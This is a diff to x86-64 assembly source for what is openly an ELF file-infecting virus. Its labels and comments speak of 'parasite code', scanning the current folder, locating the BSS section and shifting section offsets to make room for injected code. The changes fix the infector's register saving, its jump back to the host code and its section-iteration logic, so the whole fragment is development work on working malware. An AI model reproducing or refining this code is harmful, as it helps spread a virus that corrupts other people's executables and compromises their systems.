@@ -18,6 +18,7 @@ _parasiteStart:
 	push r13
 	push r14
 	push r15
+	pushfw
 
 	; # BEGIN OF PARASITE CODE, MAIN FUNC
 	push 0x2E ; FOLDER TO PARSE '.'
@@ -26,6 +27,7 @@ _parasiteStart:
 	add rsp, 8 ; POP OUR FOLDER NAME IN OBLIVION
 
 	; # RESTORE REGS
+	popfw
 	pop r15
 	pop r14
 	pop r13
@@ -40,7 +42,7 @@ _parasiteStart:
 	pop rcx
 	pop rbx
 	pop rax
-	call _code
+	jmp _code
 	ret
 
 set_mark:
@@ -306,14 +308,10 @@ _segIterate:
 	mov r11, 0 ; SETTING OUR FOUND ON/OFF IN R11
 	cmp r10, 0x40 ; CHECK IF WE HAVE READ MORE THAN 1 SHDR STRUCT
 	jl _infectEnd ; IF READ BYTES < SIZEOF SHDRSTRUCT, WEIRD FILE, END PARSING
+
 _secLoopFirstCheck:
-	cmp byte[rsp+r8+4], 8 ; CHECK IF Shdr->sh_type == SHT_NOBITS
-	jne _secLoopSndCheck
-	mov r14, 0x01
-	; # FOUND BSS SECTION
-_secLoopSndCheck:
 	cmp r14, 0x01
-	jne _secIterate
+	jne _secLoopSndCheck
 	; # BSS SECTION HAS BEEN FOUND, MUST INCREMENT THIS SECTION OFFSET CODELEN+BSS
 	; # INCREMENTING sh_addr & offset by codelen + bss size
 	; LSEEK SYSCALL
@@ -350,6 +348,12 @@ _secLoopSndCheck:
 	add rsp, 8 ; POP OUR PUSHED VALUE NOWHERE
 
 	; # WE ARE DONE MODIFYING SECTIONS !
+
+_secLoopSndCheck:
+	cmp byte[rsp+r8+4], 8 ; CHECK IF Shdr->sh_type == SHT_NOBITS
+	jne _secIterate
+	; # FOUND BSS SECTION
+	mov r14, 0x01
 
 _secIterate:
 	add r8, 0x40
